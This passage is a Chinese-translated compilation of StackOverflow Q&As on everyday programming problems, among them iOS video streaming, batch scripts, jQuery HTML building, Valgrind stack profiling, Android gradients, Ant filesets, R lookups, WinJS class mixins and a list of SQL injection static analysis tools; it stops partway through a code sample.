# StackOverflow 问答 12427000-12427999

# xamarin.ios - 使用 MPMoviePlayerController 的 Monotouch 视频流

> ID：12427008
> 
> 赞同：1
> 
> 时间：2012-09-14T14:56:48.060
> 
> 标签：xamarin.ios, video-streaming, mpmovieplayercontroller

我正在创建一个将显示流媒体视频的 Monotouch iPhone 应用程序。我已经能够让 MPMoviePlayerController 使用本地文件 (NSUrl FromFile)，但无法从媒体服务器获取视频流。

这是我用来播放视频的代码：

```
 string url = @"http://testhost.com/test.mp4";
                var nsurl = NSUrl.FromString(url);
                mp = new MPMoviePlayerController(nsurl);
                mp.SourceType = MPMovieSourceType.Streaming;

                //enable AirPlay
                //mp.AllowsAirPlay = true;

                //Add the MPMoviePlayerController View
                this.View.AddSubview(mp.View);

                //set the view to be full screen and show animated
                mp.SetFullscreen(true, true);

                //MPMoviePlayer must be set to PrepareToPlay before playback
                mp.PrepareToPlay();

                //Play Movie
                mp.Play(); 
```

在为我缺少的视频流实现 MPMoviePlayerController 时还有其他东西吗？我还读到 iOS 的视频应该在媒体服务器上使用 Apple 的 HTTP Live Streaming 进行流式传输，这是一个要求吗？我以前从未在 iOS 设备上使用过视频流，所以我不确定我的代码或媒体服务器设置或组合中是否缺少某些东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T17:55:08.040

我很确定你需要一个流媒体服务器来使用来自 HTTP url 的视频文件。但是，应用程序（在 AppStore 上）[需](https://developer.apple.com/library/ios/#documentation/NetworkingInternet/Conceptual/StreamingMediaGuide/Introduction/Introduction.html)要这样做：

> 通过蜂窝网络发送大量音频或视频数据的重要 iPhone 和 iPad 应用程序需要使用 HTTP Live Streaming。请参阅“应用程序要求”。</p>

好消息是你现有的代码不应该被改变来处理这个（它是服务器，而不是客户端）。

# batch-file - 如何创建运行用户指定软件的批处理脚本？

> ID：12427010
> 
> 赞同：2
> 
> 时间：2012-09-14T14:56:51.687
> 
> 标签：batch-file

所以基本上我想创建一个可以运行用户指定的任何记事本文件的批处理脚本。我试过这个...

```
@Echo Off
SET /P ANSWER=What is the name of the file to open?  
IF /i (%ANSWER%)==('FIND /i "*.txt" %ANSWER%) (goto :Filename)
goto :exit
:Filename
Start *.txt
EXIT
:exit
ECHO FAILLLLLLLL
PAUSE
EXIT 
```

这里的问题是第一个 IF 语句。我知道它错了。但是，我不知道如何指定任何文件名的条目。还赞赏执行此任务的不同方法。

感谢帮助 ：）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:08:08.867

如果您的目标只是打开用户在记事本中指定的文件，则以下内容适用于 Windows 7：

```
@echo off

set /P answer=What is the file name? 
if exist %answer% (
    start notepad.exe %answer%
) else (
    echo Unable to locate %answer%
) 
```

# jquery - 如何在javascript（Jquery）中放置html css php

> ID：12427011
> 
> 赞同：0
> 
> 时间：2012-09-14T14:56:57.397
> 
> 标签：jquery, html, css

我在javascript中有这个循环数据。我想为每个值放置 html css 和 php。

```
 var html = '';
              $.each(data, function(name, value) {
                 html += value.email + "<br />" + value.content + "<br />";
              });
              $('#sidebarColumn').html(html); 
```

这里我只是列出了一些值。可以说我想拥有

```
<span class="userEmail">value.email<span>
<div class="userContent">value.content</div>
<img src="<?php echo base_url() ?> value.picture" /> 
```

我如何将它们放在 JS 中，或者有其他方法可以使代码可读？

注意*我在这里使用 .html() 因为我想替换 #sidebarColumn 以前的数据并将循环数据放在该 div 中

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:18:05.183

你可以像这样在 <script> 标签中编写 php，如果那是你正在寻找的

```
<script type="text/javascript">

    var baseUrl = '<?php echo $this->baseUrl() ?>';

    var someVariable = '<?php 
                            //some more php here 
                        ?>'; 
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:17:24.413

试试这个

```
var html = '';
$.each(data, function(name, value) {

html += '<span class="userEmail">'+value.email+'<span>';
html += '<div class="userContent">'+value.content+'</div>';
html += '<img src="<?php echo base_url() ?>"' + value.picture + '/>';
});
$('#sidebarColumn').html(html); 
```

# javascript - Javascript，确定href点击是否是对javascript函数的调用

> ID：12427012
> 
> 赞同：0
> 
> 时间：2012-09-14T14:57:06.323
> 
> 标签：javascript, events, dom-events, onbeforeunload

我正在绑定`onbeforeunload`Javascript 中的事件以在卸载过程中禁用对页面的控制。在此期间，我们有一群用户正在编辑数据，这对产品造成了严重破坏。

页面上显示了一堆链接，其中包含`href="javascript:....."`.

单击这些链接会触发禁用代码，从而使页面无法使用。有没有办法可以检测`onbeforeunload`事件是导航到不同的页面还是只是触发这个 Javascript？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T15:19:23.440

让每个 href 链接访问一段 javascript 代码，该代码在执行之前检查 href 内容。

```
event.target.href.startsWith('javascript') 
```

如果是，请提交请求，如果不是，请执行其他操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:21:19.610

这不是最可靠的检查方法，但它适用于我的目的：

```
$('*:focus').attr('href') 
```

# c++ - 为什么 Valgrind 使用 boost::thread 显示堆栈使用量增加？

> ID：12427016
> 
> 赞同：13
> 
> 时间：2012-09-14T14:57:16.587
> 
> 标签：c++, linux, valgrind, boost-thread

写了一个简单的测试：

```
#include <iostream>
#include <boost/thread.hpp>

using namespace std;

void myThreadRun() {
    cout << "Thread id: " << boost::this_thread::get_id() << "\n";
}

int main() {
    for (int i = 0; i < 10000; i++) {
        boost::thread t(myThreadRun);

        t.join();
    }

    return 0;
} 
```

Valgrind Massif 在其上显示了以下图表：

![上述示例的 Valgrind Massif 分析结果](../Images/1515d969ad4dbae90353b57bcd2b78a2.png)

（堆栈分析已启用。平台：Linux Ubuntu x86）。

这个程序实际上似乎没有内存泄漏：内存使用是稳定的。

我想知道：这是 Valgrind 还是 boost::thread 的问题？或者我可能误解了什么？

你会怎么解释呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-05T22:04:28.327

这不是 boost::threads，它也发生在普通的 pthreads 上。[我从这里](https://computing.llnl.gov/tutorials/pthreads/#CreatingThreads)获取了示例程序（Pthread Creation and Termination），将线程数增加到 1000 并编译为纯 C，我在使用 massif 处理它时看到了相同的行为。所以要么是 pthreads 中的东西，要么是 valgrind/massif 正在做的事情。

编辑：也使用过程序（Pthread Joining）。见第二张图。

创建和终止：

```
 KB
547.6^                                                                       #
     |                                                                    @@@#
     |                                                                @@@@@@@#
     |                                                             @@@@@@@@@@#
     |                                                          @@@@@@@@@@@@@#
     |                                                      ::::@@@@@@@@@@@@@#
     |                                                  ::::: ::@@@@@@@@@@@@@#
     |                                               @@@::::: ::@@@@@@@@@@@@@#
     |                                           @@@@@@@::::: ::@@@@@@@@@@@@@#
     |                                        @@@@@@@@@@::::: ::@@@@@@@@@@@@@#
     |                                     @@@@@@@@@@@@@::::: ::@@@@@@@@@@@@@#
     |                                @@@@@@@ @@@@@@@@@@::::: ::@@@@@@@@@@@@@#
     |                            @@@@@ @@ @@ @@@@@@@@@@::::: ::@@@@@@@@@@@@@#
     |                         @@@@@ @@ @@ @@ @@@@@@@@@@::::: ::@@@@@@@@@@@@@#
     |                     ::@@@@@@@ @@ @@ @@ @@@@@@@@@@::::: ::@@@@@@@@@@@@@#
     |                  @@@::@ @@@@@ @@ @@ @@ @@@@@@@@@@::::: ::@@@@@@@@@@@@@#
     |               @@@@ @::@ @@@@@ @@ @@ @@ @@@@@@@@@@::::: ::@@@@@@@@@@@@@#
     |           @@@@@@ @ @::@ @@@@@ @@ @@ @@ @@@@@@@@@@::::: ::@@@@@@@@@@@@@#
     |      :::::@@@ @@ @ @::@ @@@@@ @@ @@ @@ @@@@@@@@@@::::: ::@@@@@@@@@@@@@#
     |   :@@: :: @@@ @@ @ @::@ @@@@@ @@ @@ @@ @@@@@@@@@@::::: ::@@@@@@@@@@@@@#
   0 +----------------------------------------------------------------------->Mi
     0                                                                   13.22 
```

Pthread 加入，减去数学繁忙的工作：

```
 KB
548.8^                                                             #
     |                                                           @@#::
     |                                                        :::@@#::
     |                                                     ::::::@@#:::
     |                                                  ::::: :::@@#:::::
     |                                              @@@@::::: :::@@#:::::
     |                                            @@@@@ ::::: :::@@#:::::::
     |                                        :@@:@@@@@ ::::: :::@@#:::::::@
     |                                     @@@:@ :@@@@@ ::::: :::@@#:::::::@
     |                                  :::@ @:@ :@@@@@ ::::: :::@@#:::::::@::
     |                               @@@:: @ @:@ :@@@@@ ::::: :::@@#:::::::@::
     |                            @@:@ @:: @ @:@ :@@@@@ ::::: :::@@#:::::::@::
     |                        @:::@@:@ @:: @ @:@ :@@@@@ ::::: :::@@#:::::::@::
     |                     ::@@:: @@:@ @:: @ @:@ :@@@@@ ::::: :::@@#:::::::@::
     |                  ::@: @@:: @@:@ @:: @ @:@ :@@@@@ ::::: :::@@#:::::::@::
     |               :@@::@: @@:: @@:@ @:: @ @:@ :@@@@@ ::::: :::@@#:::::::@::
     |            @@@:@ ::@: @@:: @@:@ @:: @ @:@ :@@@@@ ::::: :::@@#:::::::@::
     |         @@@@@ :@ ::@: @@:: @@:@ @:: @ @:@ :@@@@@ ::::: :::@@#:::::::@::
     |     @@@:@@@@@ :@ ::@: @@:: @@:@ @:: @ @:@ :@@@@@ ::::: :::@@#:::::::@::
     |   @@@@ :@@@@@ :@ ::@: @@:: @@:@ @:: @ @:@ :@@@@@ ::::: :::@@#:::::::@::
   0 +----------------------------------------------------------------------->Mi
     0                                                                   19.14 
```

看起来加入最终应该会降低堆栈大小，即使在 valgrind 下也是如此。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-24T17:50:57.500

您的代码不会让清理工作有机会发生。当您调用`join`一个线程时，它会一直等到线程发出完成信号，而不是实际释放其所有资源。如果您更慢地创建线程或在循环中放置延迟或屈服，“泄漏”就会消失。

# android - Android Gradient 以编程方式绘制

> ID：12427025
> 
> 赞同：12
> 
> 时间：2012-09-14T14:57:35.467
> 
> 标签：android, background, drawable

我在 xml 中定义了一个渐变可绘制对象，我将其用作背景，如下所示：

```
<?xml version="1.0" encoding="utf-8"?>
<layer-list xmlns:android="http://schemas.android.com/apk/res/android">
   <item android:bottom="4dp">
      <shape>
         <gradient
            android:startColor="@color/blue"
            android:endColor="@color/dark_blue"
            android:angle="270" />
      </shape>
   </item>
   <item android:top="98dp">
      <shape>
         <gradient
            android:startColor="@color/black"
            android:endColor="@color/transparent_black"
            android:angle="270" />
      </shape>
   </item>
</layer-list> 
```

我需要以编程方式实现这一点。我尝试使用 GradientDrawable 如下（此方法在自定义视图上实现）：

```
int[] colors1 = {getResources().getColor(R.color.black), getResources().getColor(R.color.trasparent_black)};

GradientDrawable shadow = new GradientDrawable(Orientation.TOP_BOTTOM, colors1);
shadow.setBounds(0,98, 0, 0);

int[] colors = new int[2];
colors[0] = getResources().getColor(R.color.blue);
colors[1] = getResources().getColor(R.color.dark_blue);

GradientDrawable backColor = new GradientDrawable(Orientation.TOP_BOTTOM, colors);

backColor.setBounds(0, 0,0, 4);

//finally create a layer list and set them as background.    
Drawable[] layers = new Drawable[2];
layers[0] = backColor;
layers[1] = shadow;

LayerDrawable layerList = new LayerDrawable(layers);
setBackgroundDrawable(layerList); 
```

问题是似乎设置边界是无用的，或者与（android：top，android：bottom xml参数）的工作方式不同。生成的背景是从上到下绘制的每一层，一个在另一个之上。

我想生成这样的东西：[![IMG](../Images/beba37f70f8a4ec650781cd344c6bf48.png)](https://i.stack.imgur.com/9oHc6.png)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-14T15:29:33.203

找到答案了！。可能重复[的多渐变形状](https://stackoverflow.com/questions/4381033/multi-gradient-shapes)。

替换：

```
backColor.setBounds(0, 0,0, 4);
shadow.setBounds(0,98, 0, 0); 
```

为了

```
layerList.setLayerInset(0, 0, 0, 0, 4);
layerList.setLayerInset(1, 0, 98, 0, 0); 
```

# flot - 通过 x=0 和 y=0 绘制轴

> ID：12427026
> 
> 赞同：2
> 
> 时间：2012-09-14T14:57:39.010
> 
> 标签：flot

我有一组数据，我将其绘制为散点图，在两个轴上都有正值和负值。当我在 Flot 中绘制它时，默认情况下在底部和左侧绘制轴。有没有办法让它通过图形中心绘制轴？@X=0 和 Y=0？

换句话说，而不是这样：

![在此处输入图像描述](../Images/852451599441a906e57b744db5a6c92b.png)

我想要这样的东西：

![在此处输入图像描述](../Images/ec4a792589f39ad8db4c1dabaa4c6d17.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:48:59.043

这在默认浮点数中是不可能的。我敢肯定，如果您想深入研究源代码，它可能会被黑掉，但 flot 本身仅支持 y 轴的左/右，以及 x 轴的上/下。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-20T12:42:44.120

万一其他人遇到同样的需求，我为 Flot 创建了一个插件并将其放在这里：

[https://github.com/burlandm/Flot-Origin-Axis](https://github.com/burlandm/Flot-Origin-Axis)

它可以满足我的需要，但我不会承诺它会适合您的特定场景。如果我有时间，我可能会尝试更新它以涵盖更多场景。

# windows - 有没有办法在 Windows 中将 svn 修订版作为链接发送

> ID：12427028
> 
> 赞同：0
> 
> 时间：2012-09-14T14:57:51.240
> 
> 标签：windows, svn

我们的 dba 想要将接收文件作为附件更改为某种链接到 svn 中的指定修订版。我建议复制例如

svn --force 导出`<svn url`>@ `<revision`>

到dos提示，但必须手动组装发件人和DBA想要避免任何打字的文本。

我已经浏览了 tortoise svn 但找不到任何支持这一点的东西，有没有人有任何建议？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:19:35.373

假设您通过 http 提供 Subversion，您可能知道您可以通过将浏览器指向 svn url 来浏览叶修订，例如

```
http://dotnx.svn.sourceforge.net/svnroot/dotnx/trunk/index.html 
```

为了访问特定的版本，您必须`!svn/bc/REVISION`在存储库之后插入您的 URL，例如

```
http://dotnx.svn.sourceforge.net/svnroot/dotnx/!svn/bc/11/trunk/index.html 
```

但是，我建议您设置适当的存储库浏览器，例如[viewvc](http://www.viewvc.org/)

# java - SQL 注入查找器

> ID：12427029
> 
> 赞同：5
> 
> 时间：2012-09-14T14:57:52.830
> 
> 标签：java, sql, security, static-analysis

我们有一个基于 Java 的客户端/服务器项目。最近，其中一位测试人员在测试应用程序时发现了一个 SQL 注入漏洞。

我们没有足够的资源来手动检查应用程序是否存在 SQL 注入。

是否有任何 SQL 注入查找器/静态代码分析器可以发现 Java 代码中的 SQL 漏洞？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-14T15:04:40.440

是的！

这里有一些：

*   [Armorize CodeSecure](http://www.armorize.com/codesecure/index.php)
*   [查找错误](http://findbugs.sourceforge.net/)
*   [亚斯卡](http://www.scovetta.com/yasca.html)
*   [HP Fortify 静态代码分析器](http://www.hpenterprisesecurity.com/products/hp-fortify-software-security-center/hp-fortify-static-code-analyzer/)
*   [副软件](http://www.parasoft.com/jsp/capabilities/static_analysis_java.jsp)
*   [锁具洞察力](http://www.klocwork.com/products/insight/)
*   [覆盖率静态分析](http://www.coverity.com/products/static-analysis.html)
*   [维拉码](http://www.veracode.com/products/static)
*   [校验码](http://www.checkmarx.com/technology/static-code-analysis-sca/)
*   [IBM 应用扫描](http://www-01.ibm.com/software/awdtools/appscan/)

阅读：[OWASP 的源分析工具列表](https://www.owasp.org/index.php/Source_Code_Analysis_Tools)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:00:49.083

Findbugs 确实有一个模块来检查它们，但我自己还没有运行它。 [http://findbugs.sourceforge.net/api/edu/umd/cs/findbugs/detect/FindSqlInjection.html](http://findbugs.sourceforge.net/api/edu/umd/cs/findbugs/detect/FindSqlInjection.html)

# asp.net - 使用 mvc3 重定向到默认的完整 URL

> ID：12427030
> 
> 赞同：1
> 
> 时间：2012-09-14T14:57:58.303
> 
> 标签：asp.net, asp.net-mvc-3, asp.net-mvc-areas

我想为用户提供一个友好的 URL，其中包含所需的区域，并且每当他们输入它时，该站点都会被转发到默认的控制器/操作。但是我很难弄清楚如何去做。

示例：某人键入`http://mySite.com/System`并且路由引擎重定向到完整的默认 url`http://mySite.com/System/Auth/SignIn`

我试过这个，但它不工作

```
routes.MapRoute(
   "System",                                       // Route name
   "System/{controller}/{action}",                 // URL with parameters
   new { area = "System", controller = "Auth", 
   action = "SignIn", id = UrlParameter.Optional } // Parameter defaults
); 
```

PS：当我使用区域时，系统在这种情况下是 {area}，Auth 是 {controller}，SignIn 是 {action}。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:04:56.730

可以`SystemController`在应用程序的根级别使用 a，其中`Index()`操作将简单地重定向到 /System/Auth/SignIn。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T14:59:38.620

是否有任何反向代理解决方案是托管您的应用程序的架构？

# ant - 为什么 ANT 在创建文件集后更新它的内容，我可以覆盖它吗？

> ID：12427040
> 
> 赞同：2
> 
> 时间：2012-09-14T14:58:36.153
> 
> 标签：ant, fileset

我认为这可能是一个例子最容易解释的，所以这里是：

```
<target name="test">
    <fileset id="fileset" dir="target">
        <include name="*"/>
    </fileset>
    <echo>${toString:fileset}</echo>
    <touch file="target/test"/>
    <echo>${toString:fileset}</echo>
</target> 
```

输出：

```
test:
     [echo] 
    [touch] Creating target/test
     [echo] test 
```

我理想地想要的是让文件集保持不变，这样我就可以有一个之前/之后的设置（为了使用 来获得一个改变的集合`<difference>`，所以如果你知道一种直接跳到那个的方法......）。

我尝试过使用`<filelist>`，但我无法在`<difference>`任务中正确填充和比较它（它们也很难调试，因为我似乎无法输出它们的内容）。我也尝试使用`<modified/>`来选择文件集中的文件，但它似乎根本不起作用，并且总是什么都不返回。

即使有另一种方法，我也希望能更好地理解 ANT 在上面的示例中所做的事情以及原因。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:07:39.413

文件集类似于选择器。它是一组“指令”（包含、排除、模式），允许获取一组文件。

每次您实际对文件集执行某些操作时（例如打印它“引用”的文件），实际的文件集都是根据文件集中包含的“指令”计算的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-15T04:45:45.853

路径选择器是动态评估的。添加文件后，在使用时会反映在集合中。

您可以使用[pathconvert](http://ant.apache.org/manual/Tasks/pathconvert.html)对其进行评估并将其保存在变量中。然后可以使用 pathtofilest 将其转换回[filest](http://ant-contrib.sourceforge.net/tasks/tasks/pathtofileset.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-18T08:42:51.693

正如 Jayan 指出的那样，发布最终结果作为答案可能值得，所以这里有一个包含关键部分的简化版本：

```
<fileset id="files" dir="${target.dir}"/>
<pathconvert property="before.files" pathsep=",">
    <fileset refid="files"/>
</pathconvert>
<!-- Other Ant code changes the file-system. -->
<pathconvert property="after.files" pathsep=",">
    <fileset refid="files"/>
</pathconvert>
<filelist id="before.files" files="${before.files}"/>
<filelist id="after.files" files="${after.files}"/>
<difference id="changed.files">
    <filelist refid="before.files"/>
    <filelist refid="after.files"/>
</difference> 
```

# r - R如何使用来自另一个data.frame的值更新data.frame中的列

> ID：12427043
> 
> 赞同：0
> 
> 时间：2012-09-14T14:58:41.390
> 
> 标签：r

R 新手。我有一个 data.frame

```
'data.frame':   2070 obs. of  5 variables:
 $ id   : int  16625062 16711130 16625064 16668358 16625066 16711227 16711290 16668746     16711502 16625494 ...
 $ subj : Factor w/ 3 levels "L","M","S": 1 1 1 1 1 1 1 1 1 1 ...
 $ grade: int  4 6 4 5 4 6 6 5 6 4 ...
 $ score: int  225 225 0 225 225 375 375 125 225 125 ...
 $ level: logi  NA NA NA NA NA NA ... 
```

和一个名为查找的命名数字列表

```
 Named num [1:12] 12 19 20 26 31 32 49 67 72 73 ...
 - attr(*, "names")= chr [1:12] "0" "50" "100" "125" ... 
```

我想找到一种方法来通过查找查找列表中的值来更新数据框“级别”列，将数据框“分数”列与查找列表中的数字名称相匹配。换句话说，数据框中的分数值用于在查找列表中查找数字（将进入级别列）。

所以......如果有人明白我的意思......请帮忙。

谢谢罗本

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:04:49.967

你应该能够做到这一点（假设你的数据框被称为`d`）：

```
d$level = as.numeric(lookup[as.character(d$score)]) 
```

例如：

```
lookup = list(1, 2, 3, 4)
names(lookup) = c("0", "50", "100", "150")

d = data.frame(score=c(50, 150, 0, 0), level=NA)
d$level = as.numeric(lookup[as.character(d$score)])
print(d)
#   score level
# 1    50     2
# 2   150     4
# 3     0     1
# 4     0     1 
```

# c++ - #pragma comment(linker, "/STACK:val"), 哪个基础 val 可以？

> ID：12427045
> 
> 赞同：0
> 
> 时间：2012-09-14T14:58:45.153
> 
> 标签：c++, stack, pragma

是

```
#pragma comment(linker, "/STACK:0x04000000") 
```

相当于

```
#pragma comment(linker, "/STACK:67108864") 
```

?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T15:00:02.783

是 0x04000000 是 67108864（基数 10）的十六进制（基数 16）表示

# jquery - 在输入字段上获取 .focus() jquery 以在移动设备上自动显示软键盘

> ID：12427052
> 
> 赞同：0
> 
> 时间：2012-09-14T14:59:03.937
> 
> 标签：jquery, mobile, cordova, android-softkeyboard, soft-keyboard

我已经查看了一些关于这个主题的教程，似乎几乎不可能使用 javascript /jquery 来让键盘在用户登陆页面时立即显示。到目前为止，我有：

```
<textarea id="play_challenge" class="no_hover" autofocus></textarea>

 $('.message').fadeOut('fast', function(){
    $('#challenge').fadeIn('fast');
    $("#play_challenge").select();
    $("#play_challenge").focus();
    $("#play_challenge").trigger('change');
        }); 
```

所以我想借此机会围绕这个问题提出一些问题，但仍然相关。有没有人将android和ios的java和/或objective-c分别集成到html/php网页中？我的想法是通过任何可能的方式将软键盘加载到我的网络应用程序中。它是一个文字输入游戏。

如果有人对 phonegap、jquerymobile、sencha 或任何其他网络应用程序平台有任何良好的经验，这些平台可能具有此类实例的可扩展功能。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T23:21:20.960

有或没有软键盘，这可以通过添加属性为带有cordova的**iOS完成**

```
KeyboardDisplayRequiresUserAction=NO; 
```

到您的**Cordova.plist**文件，然后**调用**

```
$("textfieldID").focus(); 
```

你可以[在这里阅读更多关于它的信息](https://stackoverflow.com/questions/12140484/programmatically-show-soft-keyboard-on-iphone-in-a-phonegap-application/13809533#13809533)

# python - 是否可以分层标记 matplotlib (pyplot) 条形图？

> ID：12427056
> 
> 赞同：4
> 
> 时间：2012-09-14T14:59:21.397
> 
> 标签：python, matplotlib, pandas

我已经设法使用 matplotlib.pyplot 制作了以下条形图。

![在此处输入图像描述](../Images/19ef54f6489be95998f9709fc64a0e22.png)

该图来自一个聚合的 PANDAS DataFrame，打印在下面。请注意，条形图中的每个条形对应于`mean`列中的一个值。另请注意，这些值**不是**零，而是 PANDAS 输出`0`以及`-0`浮点数非常小时。

```
Group Local Global Attn  mean
ASub  LD    GD     Attn    -0
                   Dist    -0
            GS     Attn    -0
                   Dist    -0
      LS    GD     Attn    -0
                   Dist    -0
            GS     Attn    -0
                   Dist    -0
DSub  LD    GD     Attn    -0
                   Dist     0
            GS     Attn    -0
                   Dist    -0
      LS    GD     Attn    -0
                   Dist    -0
            GS     Attn    -0
                   Dist    -0 
```

我想以与上面的标签相对应的方式分层标记条形图的 x 轴。换言之，x 轴的左半部分对应于`ASub`组。组的左半部分`ASub`对应因子的`LD`水平 `Local`，以此类推……

这可以做到吗？

**编辑：**

我想我可能应该确切地澄清我想要什么。我希望有几个标签，从最一般的（组）到最具体的（Attn），类似于上面 DataFrame 左侧 4 列的组织。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-16T18:19:28.650

在 master 上实现了（我使用随机数据表示“平均值”），请参见底部的图像。如果您不想升级，也可以手动设置：

```
In [143]: ax = df.plot(kind='bar')

In [144]: ax.set_xticklabels(['|'.join(t) for t in df.index]) 
```

![在此处输入图像描述](../Images/1b3c9ab61f31d1024e16fc9a87099019.png)

编辑：

```
 In [167]: ax = df.plot(kind='bar')

 In [168]: ax.set_xticklabels(df.index.format(names=False)) 
```

![在此处输入图像描述](../Images/e4bcfb6182c0cbad67309cdcc266190a.png)

# javascript - 未设置变量

> ID：12427059
> 
> 赞同：0
> 
> 时间：2012-09-14T14:59:28.913
> 
> 标签：javascript, function, methods, web

> **可能重复：**
> [从 Javascript 方法返回全局变量](https://stackoverflow.com/questions/12426135/return-global-variable-from-javascript-method)

我有这个。

```
var thisData = "";
function calculateThings(newData) {
     thisData = newData.things.otherthings //has a value of 10;
}
alert(thisData) //returns nothing 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:01:05.430

你需要调用你的函数：

`calculateThings(newData);`

应该更像：

```
 var thisData = "";
 function calculateThings(data) {
      thisData = data.things.otherthings //has a value of 10;
 }
 calculateThings(newData);
 alert(thisData) //returns nothing 
```

其中 data 是您的参数，您可以将任何您想要的内容传递给它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:01:03.513

您创建了一个函数，但从未调用它。您需要通过以下方式调用它：

```
var thisData = "";
function calculateThings(newData) {
     thisData = newData.things.otherthings //has a value of 10;
}
alert(calculateThings(thisData)); 
```

或者您可以自行调用该函数，例如：

```
(function calculateThings(newData) {
     thisData = newData.things.otherthings //has a value of 10;
})() 
```

# javascript - Mootools 和 Win8 Store 应用程序开发

> ID：12427061
> 
> 赞同：1
> 
> 时间：2012-09-14T14:59:32.393
> 
> 标签：javascript, oop, mootools, windows-runtime, winjs

**问题一：**

我们可以在开发 Windows 8 Metro 风格应用程序时使用[Mootools 的 Mixin 模式吗？](http://jqueryvsmootools.com/index.html)换句话说，我们可以用 Mootool 的类覆盖/替换/扩展[WinJS.Class吗？](http://msdn.microsoft.com/en-us/library/windows/apps/Hh967790.aspx)

**问题2：**

例如，在 Mootools 中，如果我们有一个**基类**Human：

```
var Human = new Class({
    initialize: function(name, age) {
        this.name = name;
        this.age = age;
    },
    isAlive: true,
    energy: 1,
    eat: function() {
        this.energy = this.energy + 1; //same as this.energy++
    }
}); 
```

（使用 Mixin）一个**接口类**Warrior：

```
var Warrior = new Class({
    energy: 100,
    kills: 0,
    attack: function(target) {
        target.isAlive = false;
        this.energy = this.energy - 5;
        this.kills++;
    }
}); 
```

和一个**派生/具体类**忍者：

```
var Ninja = new Class({
    Extends: Human,
    Implements: Warrior,
    initialize: function(name, age, side) {
        this.side = side;
        this.parent(name, age);
    }
}); 
```

我们如何使用[WinJS.Class.define](http://msdn.microsoft.com/en-us/library/windows/apps/br229813.aspx)、[WinJS.Class.derive](http://msdn.microsoft.com/en-us/library/windows/apps/br229815.aspx)和[WinJS.Class.mix](http://msdn.microsoft.com/en-us/library/windows/apps/br229836.aspx)用 WinJS 口音说这个？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T02:16:50.983

如果你想在你的 WinJS 应用程序中使用 MooTools，它应该可以在大多数情况下工作。启动时可能会出现一些警告，但只要不违反动态生成内容的安全框架，MooTools 本身应该可以正常工作。我不会尝试将 MooTools 的代码拼接到 WinJS 中，而是按原样使用它。

WinJS.Class 方法就像 MooTools 一样，在底层定义 JavaScript 原型。无论您使用的是 MooTools 还是 WinJS，您定义的“类型”都应该一起工作。

至于你的第二个问题，我认为你可以用 WinJS 做你需要的一切，只是语法不同。

定义你的“人类”构造函数很简单：

```
var Human = WinJS.Class.define(
    function(name, age) {
        this.name = name;
        this.age = age;
    },
    {
        isAlive: true,
        energy: 1,
        eat: function() {
            this.energy = this.energy + 1;
        }
    }
); 
```

mixin 被简单地定义为一个对象：

```
var Warrior = {
    energy: 100,
    kills: 0,
    attack: function(target) {
        target.isAlive = false;
        this.energy = this.energy - 5;
        this.kills++;
    }
}; 
```

要进行推导，您可以使用 WinJS.Class.derive。这只会给你继承部分：

```
var Ninja = WinJS.Class.derive(Human,
    function(name, age, side) {
        this.side = side;
        Human.call(this, name, age);
    }
); 
```

然后你通过 WinJS.Class.mix 进行混入：

```
WinJS.Class.mix(Ninja, Warrior); 
```

你应该做好准备：

```
var clyde = new Ninja("Clyde", "12", "confused"); 
```

# r - 如何阻止 source 缩写函数名称？

> ID：12427064
> 
> 赞同：0
> 
> 时间：2012-09-14T14:59:37.850
> 
> 标签：r, function, abbreviation

我正在尝试获取多个功能，它们的名称不同。

例如：func1、func2。

我尝试使用“func_1”和“func_2”，以及将数字放在第一位，“1func”和“2func”。无论我如何索引函数名称，源函数只会读入它调用的一个函数`"func"`——这不是我想要的。

我尝试过使用 for-loops 和 sapply：

**for循环：**

```
func.list <- list.files(path="/some_path",pattern="some pattern",full.names=TRUE)
for(i in 1:length(func.list)){
source(func.list[i])
} 
```

**应用：**

```
sapply(func.list,FUN=source) 
```

我将编写数据校正函数的多个版本，并且真的希望能够对它们进行索引 - 因为给出一个简洁但具体的名称会很困难，并且不允许我有选择地只从函数文件中获取他们的目录。

在我的代码中，func.list 给出了输出（由于隐私/合同问题，我已经替换了实际目录）：

```
[1] "mypath/1resp.correction.R" 
[2] "mypath/2resp.correction.R" 
```

然后，当我使用 for-loop 或 sapply 代码（如上所列）获取 func.list 时，R 仅加载一个名为 resp.correction 的函数，其代码主体来自“2resp.correction.R”。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T15:21:22.237

to 的参数`source`是文件名，而不是函数名。所以你不能在这里花哨：你需要提供确切的文件名。

听起来您的两个文件在两个文件中都包含具有相同名称 ( `resp.correction`) 的函数的定义，所以是的，当您一个接一个地获取文件时，该函数在您的全局环境中被覆盖。

您可以在循环内将函数重新分配给不同的名称：

```
func.list <- list.files(path="/some_path",pattern="some pattern",full.names=TRUE)
for(i in 1:length(func.list)) {
   source(func.list[i], local = TRUE)
